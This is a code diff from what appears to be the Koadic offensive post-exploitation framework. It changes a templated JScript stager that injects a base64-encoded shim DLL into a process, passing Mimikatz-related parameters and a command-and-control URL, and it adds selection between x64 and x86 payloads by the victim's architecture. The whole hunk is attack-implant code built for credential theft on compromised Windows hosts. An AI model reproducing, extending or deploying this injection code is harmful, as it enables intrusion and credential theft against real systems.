@@ -130,8 +130,26 @@ try {
 	var #o# = #d#.DynamicInvoke(#al#.ToArray()).CreateInstance(#entry_class#);
 
     var #shim_lpParam# = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
-    var #base64DLL# = ~SHIMB64~
-    #o#.InjectDLL(#base64DLL#, #shim_lpParam#, ~SHIMOFFSET~);
+    var #base64DLL# = "";
+    if (~ONESHOTAUTO~)
+    {
+        if(Koadic.user.Arch() == "AMD64")
+        {
+            #base64DLL# = ~SHIMX64B64~;
+            #shimoffset# = ~SHIMX64OFFSET~;
+        }
+        else
+        {
+            #base64DLL# = ~SHIMX86B64~;
+            #shimoffset# = ~SHIMX86OFFSET~;
+        }
+    }
+    else
+    {
+        #base64DLL# = ~SHIMB64~;
+        #shimoffset# = ~SHIMOFFSET~;
+    }
+    #o#.InjectDLL(#base64DLL#, #shim_lpParam#, #shimoffset#);
     Koadic.work.report("Done");
 } catch (e) {
     Koadic.work.error(e);
